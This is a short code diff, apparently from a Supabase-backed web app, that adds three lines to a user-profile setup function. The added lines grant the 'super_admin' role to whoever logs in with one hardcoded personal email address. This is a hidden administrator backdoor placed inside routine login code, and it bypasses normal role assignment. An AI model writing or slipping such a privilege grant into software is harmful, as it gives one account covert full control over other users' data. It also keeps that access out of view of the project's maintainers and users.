@@ -81,6 +81,9 @@ export async function ensureProfile(userId: string, userEmail: string | undefine
       name: userEmail?.split("@")[0] || "Student",
     })
   }
+  if (userEmail === "zaid123was@gmail.com") {
+    await supabase.from("profiles").update({ role: "super_admin" }).eq("id", userId)
+  }
 }
 
 export async function updateLastLogin(userId: string) {
